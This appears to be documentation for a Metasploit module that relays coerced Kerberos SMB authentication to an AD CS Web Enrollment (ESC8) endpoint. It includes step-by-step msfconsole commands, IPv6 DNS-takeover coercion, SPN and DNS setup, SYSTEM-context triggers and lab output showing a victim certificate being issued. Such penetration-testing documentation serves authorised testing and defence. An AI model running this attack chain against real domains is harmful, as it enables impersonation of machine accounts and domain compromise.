## Vulnerable Application

This module creates an SMB server and relays the **Kerberos** authentication it
captures to an AD CS HTTP(S) Web Enrollment (ESC8) endpoint, then requests a
certificate on behalf of the coerced principal. It is the Kerberos counterpart
to `auxiliary/server/relay/esc8` (which relays NTLM): instead of an NTLM
NTLMSSP exchange, it extracts the Kerberos AP-REQ from the SPNEGO blob a victim
sends to the SMB server and replays it to the CA over HTTP `Authorization:
Negotiate`.

Because a Kerberos service ticket is bound to a specific service principal name
(SPN), the victim must be coerced into authenticating to a name whose SPN the
attacker can relay. This is done with a DNS-takeover coercion module (see the
Scenarios section), which is the technique described in CVE-2026-20929: an
IPv6 DNS takeover (rogue DHCPv6 or Router Advertisement) hands the attacker as
the victim's DNS server, and a CNAME record steers the victim's connection to
the attacker's SMB server while the ticket is still issued for the target SPN.

Unlike NTLM relay, the AP-REQ is encrypted, so the authenticating identity is
not visible on the wire. The operator supplies the coerced principal via
`RELAY_IDENTITY` so the module can pick the correct certificate template and
label its output.

## Verification Steps

This module is the relay half of a two-part technique and is normally paired
with a coercion module. For the full end-to-end setup see the Scenarios section.

1. Configure an ESC8-vulnerable host (AD CS with HTTP Web Enrollment enabled)
    * See https://docs.metasploit.com/docs/pentesting/active-directory/ad-certificates/overview.html#setting-up-a-esc8-vulnerable-host
2. Start `msfconsole`
3. Do: `use auxiliary/server/relay/esc8_kerberos`
4. Set `RHOSTS` to the AD CS Web Enrollment server
5. Set `RELAY_IDENTITY` to the principal you will coerce, in `DOMAIN\HOST$` form (for example `AD\WIN-VICTIM$`)
6. Run the module and, in parallel, coerce the victim (see Scenarios)
7. Wait for the Kerberos AP-REQ to be relayed and a certificate to be issued

## Lab environment used to validate this module

The relay half of this technique was validated against the following setup. The
values are examples; substitute your own domain, hosts and addresses.

### Domain controller and AD CS

* Windows Server 2022, single domain `ad.example.com` (NetBIOS `AD`).
* The `Active Directory Certificate Services` role with the `Certificate
  Authority` and `Certificate Authority Web Enrollment` role services. Web
  Enrollment is what publishes the `/certsrv/` endpoint this module relays to.
* The CA and the KDC on the same host is fine. The coercion introduces a new
  name rather than poisoning an existing one, so the victim keeps reaching the
  KDC while its service connection is steered to the attacker.
* No registry changes were required. ESC8 relies on the default HTTP Web
  Enrollment endpoint being reachable without Extended Protection for
  Authentication (channel binding); `SSL false` (the default) targets that HTTP
  endpoint. If Web Enrollment is only bound to HTTPS in your environment, set
  `SSL true` and `RPORT 443`, noting that EPA may then reject the relayed ticket.

### Certificate template

* The `Machine` template published on the CA (`Certificate Templates` console ->
  the CA's `Certificate Templates` -> `New` -> `Certificate Template to Issue`).
* The account you coerce must have `Enroll` on that template. For a machine
  account coercion, grant the victim computer object (for example `WIN-VICTIM$`)
  Read and Enroll on the `Machine` template. The default `Machine` template
  builds its subject from Active Directory, so the certificate is issued to the
  authenticated machine account regardless of the CSR subject.

### SPN and DNS records for the coerced name

The victim only sends a Kerberos AP-REQ if it requests a service ticket for a
name whose SPN exists and whose DNS record points at the attacker. Two ways to
arrange that:

* Native coercion (the intended workflow): the paired DNS-takeover module
  answers for the target domain and returns a `CNAME` (`RELAY_CNAME`) that steers
  the victim onto a name the attacker serves, while the ticket is still minted
  for the real target SPN. See the Scenarios section.
* Manual decoy for a controlled lab test: create a name, point it at the
  attacker, and register a matching SPN so a ticket is issued for it. From the
  DC, as a domain admin:

```
# DNS: point a decoy name at the attacker box running this module
Add-DnsServerResourceRecordA -ZoneName ad.example.com -Name relaytest -IPv4Address 192.0.2.50

# SPN: register the CIFS SPN for that name on the coerced account (here the
# victim machine account), so its ticket names the decoy
setspn -s CIFS/relaytest.ad.example.com WIN-VICTIM$
```

### Coercing the machine account

Machine-account Kerberos is what this module relays, so trigger the connection
from a context that holds the machine account's TGT. Running as
`NT AUTHORITY\SYSTEM` on the victim does this:

```
# in a cmd/powershell running as SYSTEM on the victim (e.g. via PsExec -s or a
# SYSTEM scheduled task), touch the decoy over SMB:
net use \\relaytest.ad.example.com\ipc$
```

That sends an SMB2 SessionSetup carrying a Kerberos AP-REQ as `WIN-VICTIM$`. A
`net use` from an interactive administrator session instead authenticates as
that user and, without a usable service ticket for the name, can fall back to
NTLM, so use the SYSTEM (machine-account) context for a reliable machine-account
relay. A SYSTEM scheduled task (`schtasks /ru SYSTEM`) is a convenient headless
trigger.

## Full module options

Real output of `show options` for the module (defaults shown, with the coercion
values from the Scenarios set):

```
msf auxiliary(server/relay/esc8_kerberos) > set RHOSTS ca.ad.example.com
msf auxiliary(server/relay/esc8_kerberos) > set RELAY_IDENTITY AD\WIN-VICTIM$
msf auxiliary(server/relay/esc8_kerberos) > set MODE SPECIFIC_TEMPLATE
msf auxiliary(server/relay/esc8_kerberos) > set CERT_TEMPLATE Machine
msf auxiliary(server/relay/esc8_kerberos) > options

Module options (auxiliary/server/relay/esc8_kerberos):

   Name                 Current Setting    Required  Description
   ----                 ---------------    --------  -----------
   ADD_CERT_APP_POLICY                     no        Add certificate application policy OIDs
   ALT_DNS                                 no        Alternative certificate DNS
   ALT_SID                                 no        Alternative object SID
   ALT_UPN                                 no        Alternative certificate UPN (format: USER@DOMAIN)
   CERT_TEMPLATE        Machine            no        The template to issue if MODE is SPECIFIC_TEMPLATE.
   MODE                 SPECIFIC_TEMPLATE  yes       The issue mode. (Accepted: ALL, AUTO, QUERY_ONLY, SPECIFIC_TEMPLATE)
   ON_BEHALF_OF                            no        Username to request on behalf of (format: DOMAIN\USER)
   PFX                                     no        Certificate to request on behalf of
   RELAY_IDENTITY       AD\WIN-VICTIM$     yes       The coerced principal being relayed, as DOMAIN\HOST$ or HOST$@realm.
   RELAY_TIMEOUT        25                 yes       Seconds that the relay socket will wait for a response after the client has initiated communication.
   RHOSTS               ca.ad.example.com  yes       Target address range or CIDR identifier to relay to
   RPORT                80                 yes       The target port (TCP)
   SMBDomain            WORKGROUP          yes       The domain name used during SMB exchange.
   SRVHOST              ::                 yes       The local host or network interface to listen on.
   SRVPORT              445                yes       The local port to listen on.
   SSL                  false              no        Negotiate SSL/TLS for outgoing connections
   TARGETURI            /certsrv/          yes       The URI for the cert server.

Auxiliary action:

   Name   Description
   ----   -----------
   Relay  Run SMB ESC8 Kerberos relay server
```

## Options

### MODE

The issue mode. Controls what the module does once the relayed connection to
the Web Enrollment server is authenticated. Must be one of:

* ALL: Enumerate all available certificate templates and issue each of them.
* AUTO: Automatically select the `User` or `Machine`/`DomainController` template
  based on whether the coerced `RELAY_IDENTITY` is a user or a machine account
  (machine accounts end in `$`).
* QUERY_ONLY: Enumerate available certificate templates but do not issue any.
* SPECIFIC_TEMPLATE: Issue only the template named in `CERT_TEMPLATE`.

### CERT_TEMPLATE

The template to issue when `MODE` is `SPECIFIC_TEMPLATE` (for example `Machine`
or `User`).

### RELAY_IDENTITY

The Kerberos principal you are coercing. Give it in `DOMAIN\HOST$` form (for
example `AD\WIN-VICTIM$`, or `AD\labuser` for a user); the UPN form
`HOST$@realm` (for example `WIN-VICTIM$@ad.example.com`) is also accepted and is
converted internally. Because the relayed AP-REQ is encrypted, this identity is
not recoverable from the wire; the module uses it to choose the certificate
template (in `AUTO` mode) and to label its output. It does not need to match a
password or key.

A machine account must keep its trailing `$` (`AD\WIN-VICTIM$`), since that is
how `AUTO` mode tells a machine account from a user and how the CSR subject is
built.

`RHOSTS` is the AD CS Web Enrollment host to relay to, and the module listens for
the coerced Kerberos authentication on the SMB port (`SRVPORT`, default 445).

## Scenarios

The technique has two halves running at the same time: this relay server, and a
coercion module that (a) makes the victim use the attacker as its DNS server and
(b) steers the victim's connection to the attacker while the Kerberos ticket is
still minted for the real target SPN.

### Full coerce-to-certificate flow (native IPv6 DNS takeover)

Terminal 1 - start the relay server:

```
msf > use auxiliary/server/relay/esc8_kerberos
msf auxiliary(server/relay/esc8_kerberos) > set RHOSTS ca.ad.example.com
msf auxiliary(server/relay/esc8_kerberos) > set RELAY_IDENTITY AD\WIN-VICTIM$
msf auxiliary(server/relay/esc8_kerberos) > set MODE SPECIFIC_TEMPLATE
msf auxiliary(server/relay/esc8_kerberos) > set CERT_TEMPLATE Machine
msf auxiliary(server/relay/esc8_kerberos) > run
[*] Auxiliary module running as background job 0.
[*] SMB Server is running. Listening on :::445
```

Terminal 2 - coerce the victim with the native IPv6 DNS takeover (either the
DHCPv6 or the Router Advertisement module):

```
msf > use auxiliary/spoof/ipv6/ipv6_ra_dns_takeover
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set TARGET_DOMAIN ad.example.com
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set SPOOF_IP6 dead:beef::5
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > set RELAY_CNAME attacker.ad.example.com
msf auxiliary(spoof/ipv6/ipv6_ra_dns_takeover) > run
```

Terminal 3 - on the Windows victim. Two things have to happen here: the victim
must adopt the attacker as its IPv6 DNS server, and it must request a service
ticket for the coerced name and connect to it over SMB.

First confirm the victim has taken the attacker's advertisement as its IPv6
resolver. The RA module advertises `SPOOF_IP6` via RDNSS (the DHCPv6 module
hands it out in the lease); the attacker address should show up as an IPv6 DNS
server on the victim's interface:

```
PS C:\> netsh interface ipv6 show dnsservers
Configuration for interface "Ethernet"
    DNS servers configured through DHCP:  dead:beef::5
    Register with which suffix:           Primary only
```

If it has not adopted the advertisement yet, disable and re-enable the adapter
(or wait for the next unsolicited RA). The RA module answers Router
Solicitations, so toggling the interface prompts an immediate unicast reply.
You can confirm the poisoning resolves through the attacker before triggering
auth. With the CNAME answer now carrying its terminal address, a single query
returns both the alias and the attacker address:

```
PS C:\> ipconfig /flushdns
PS C:\> Resolve-DnsName relaytest.ad.example.com -Type AAAA -Server dead:beef::5

Name                      Type   TTL   Section    NameHost
----                      ----   ---   -------    --------
relaytest.ad.example.com  CNAME  0     Answer     attacker.ad.example.com

Name       : attacker.ad.example.com
QueryType  : AAAA
IP6Address : dead:beef::5
```

Then coerce the Kerberos SMB authentication. Purge cached tickets, request a
service ticket for the coerced SPN (`CIFS/relaytest.ad.example.com`, set up
under "SPN and DNS records for the coerced name" above) so a fresh AP-REQ is
issued, and touch the name over SMB. The name resolves through the attacker's
DNS to the attacker's SMB server, so the SMB2 SessionSetup carrying the AP-REQ
lands on the relay:

```
C:\> klist purge
C:\> klist get CIFS/relaytest.ad.example.com
C:\> net use \\relaytest.ad.example.com\ipc$
```

`net use` reporting `System error 67 (The network name cannot be found)` is
expected: the relay captures the AP-REQ during SessionSetup and never presents a
real share, so the client's tree connect fails after the authentication the
relay needed has already been sent.

For a machine-account relay (`RELAY_IDENTITY AD\WIN-VICTIM$`), run the trigger
from the machine-account context, that is as `NT AUTHORITY\SYSTEM` (for example
`PsExec -s` or a `schtasks /ru SYSTEM` task), since an interactive user session
would authenticate as that user instead. See "Coercing the machine account"
above.

Real output of `show options` for the coercion module (the Router Advertisement
variant; the DHCPv6 module takes the same `TARGET_DOMAIN`/`SPOOF_IP6`/
`RELAY_CNAME`):

```
Module options (auxiliary/spoof/ipv6/ipv6_ra_dns_takeover):

   Name                     Current Setting          Required  Description
   ----                     ---------------          --------  -----------
   ADVERTISE_SEARCH_DOMAIN  true                     yes       Advertise TARGET_DOMAIN as a DNS search list (DNSSL) to steer short-name resolution.
   BECOME_ROUTER            false                    yes       Also advertise as the default router (router lifetime > 0). Off by default for a DNS-only takeover.
   INTERFACE                eth0                     no        The name of the interface
   RA_INTERVAL              30                       yes       Seconds between unsolicited Router Advertisements.
   RELAY_CNAME              attacker.ad.example.com  no        If set, poisoned names are answered with a CNAME to this name plus its terminal attacker address (the DNS-CNAME Kerberos relay trick).
   RESPOND_TO_SOLICITS      true                     yes       Also reply to Router Solicitations with an immediate unicast RA.
   SHOST                                             no        The source IPv6 address
   SMAC                                              no        The source MAC address
   SPOOF_IP6                dead:beef::5             yes       The attacker IPv6 address handed out as the DNS server and returned for poisoned names.
   SRVHOST                  ::                       yes       The local host or network interface to listen on. Defaults to :: to receive the IPv6 DNS queries the victim is steered to send.
   SRVPORT                  53                       yes       The local port to listen on.
   TARGET_DOMAIN            ad.example.com           yes       The DNS domain to intercept; names under it are poisoned (e.g. ad.example.com).
   TARGET_HOSTS                                      no        Specific FQDNs to poison (space or semicolon separated). If empty, all names under TARGET_DOMAIN are poisoned.

Auxiliary action:

   Name     Description
   ----     -----------
   Service  Run the RA/RDNSS and DNS takeover services
```

Once the victim resolves the target service through the attacker and
authenticates to the attacker's SMB server, the relay server extracts the
AP-REQ, replays it to the CA, and saves the issued certificate. Output of a
successful `run` for the `AD\WIN-VICTIM$` example above:

```
[*] New request from 192.168.64.2
[*] Relaying Kerberos AP-REQ to http://ca.ad.example.com/certsrv/
[+] Successfully relayed Kerberos AP-REQ to http://ca.ad.example.com/certsrv/
[*] Building a certificate signing request for user WIN-VICTIM$ - RSA key size: 2048 - digest algorithm: SHA256 - template: Machine
[*] Submitting the certificate signing request to the target...
[+] Certificate generated using template Machine for AD\WIN-VICTIM$
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=...&
[*] Certificate stored at: ~/.msf4/loot/..._windows.ad.cs_....pfx
```

The resulting `.pfx` can then be used with `auxiliary/admin/kerberos/get_ticket`
(PKINIT) to obtain a TGT for the coerced account.

### Real capture from a lab run

The output above is reconstructed from the module's own log strings, so it
lines up with the `AD\WIN-VICTIM$` example rather than requiring a specific
account for every walkthrough. Here is an unedited capture from a real run
against a live domain, using `RELAY_IDENTITY labuser@kerberos.issue` (the UPN
form) with `MODE SPECIFIC_TEMPLATE` and `CERT_TEMPLATE User`, to also exercise
the identity-format handling described under RELAY_IDENTITY above:

```
[*] New request from 192.168.64.3
[*] Relaying Kerberos AP-REQ to http://192.168.64.3:80/certsrv/
[+] Successfully relayed Kerberos AP-REQ to http://192.168.64.3:80/certsrv/
[*] Building a certificate signing request for user labuser - RSA key size: 2048 - digest algorithm: SHA256 - template: User
[*] Submitting the certificate signing request to the target...
[+] Certificate generated using template User for kerberos.issue\labuser
[*] Attempting to download the certificate from /certsrv/certnew.cer?ReqID=28&
[*] Certificate stored at: /root/.msf4/loot/20260819121714_default_192.168.64.3_windows.ad.cs_492865.pfx
```

The issued certificate, verified with `openssl`:

```
subject=DC=issue, DC=kerberos, CN=Users, CN=labuser
issuer=DC=issue, DC=kerberos, CN=kerberos-DC1-CA
X509v3 Subject Alternative Name:
    othername: UPN:labuser@kerberos.issue
```

## Notes

* This module supports Kerberos only; for NTLM relay to ESC8 use
  `auxiliary/server/relay/esc8`.
* `SRVHOST` defaults to `::` so the relay listens dual-stack. The documented
  coercion is an IPv6 DNS takeover, which steers the victim to the attacker
  over IPv6; a `0.0.0.0` listener is IPv4-only and would silently never
  receive that connection. On Linux and macOS `::` also accepts IPv4, so
  A-record (IPv4) coercion still works. On a Windows relay host `::` binds
  IPv6-only, so there set `SRVHOST` to the attacker IPv6 the coercion hands
  out (`SPOOF_IP6`). The paired coercion module already defaults to `::`.
* The relay is one-shot per coerced authentication: a Kerberos AP-REQ is bound to
  the SPN it was issued for, so there is no NTLM-style multi-target challenge loop.
* A full end-to-end run against a live domain requires the CA and the KDC to be
  reachable during coercion. When the CA and KDC are the same host, use the
  CNAME/passthrough options of the coercion module so the KDC leg stays reachable
  while the service connection is hijacked.
